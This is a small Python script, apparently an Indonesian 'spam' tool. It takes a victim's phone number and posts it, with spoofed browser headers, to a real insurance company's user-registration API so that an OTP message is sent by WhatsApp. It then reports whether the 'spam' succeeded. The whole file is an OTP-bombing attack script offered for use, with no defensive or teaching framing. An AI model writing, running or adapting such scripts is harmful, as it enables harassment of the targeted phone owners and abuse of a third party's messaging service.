import os
import sys
import requests
import json
os.system('clear')

# Bisa Di Ubah Sesuka Hati Kleaan:v
print('''\033[1m
[+] Author      : Zaunkssec
[+] Github      : github.com/TZdev7
[+] Youtube     : TZdev7

[ example : 85773438857 ]
\033[0m'''.lower())

no = input('phone number  : ')

head = {
"Host": "api.qoalaplus.com",
"content-length": "48",
"accept": "application/json, text/plain, */*",
"content-type": "application/json",
"sec-ch-ua-mobile": "?1",
"user-agent": "Mozilla/5.0 (Linux; Android 11; 220333QAG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36",
"sec-ch-ua-platform": "Android",
"origin": "https://www.qoalaplus.com",
"sec-fetch-site": "same-site",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": "https://www.qoalaplus.com/",
"accept-encoding": "gzip, deflate, br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

dat = json.dumps({"phone_number":"+670"+no,"channel":"WA"})
kon = requests.post('https://api.qoalaplus.com/go-agent/v2/user/register',headers=head,data=dat).text
if "success" in kon:
        print('=> spam Berhasil ')
else:
        print('=> spam Gagal ')
